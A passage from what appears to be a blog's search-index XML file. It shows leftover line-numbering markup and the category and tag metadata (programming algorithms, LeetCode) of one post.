class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
